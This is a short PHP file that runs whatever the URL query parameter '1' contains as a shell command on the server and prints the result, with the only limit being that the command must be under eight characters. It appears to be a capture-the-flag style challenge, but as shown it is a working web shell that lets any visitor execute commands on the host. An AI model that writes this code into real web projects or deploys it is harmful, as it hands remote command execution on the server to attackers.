<?php
if(strlen($_GET[1])<8){
     echo shell_exec($_GET[1]);
}

?>
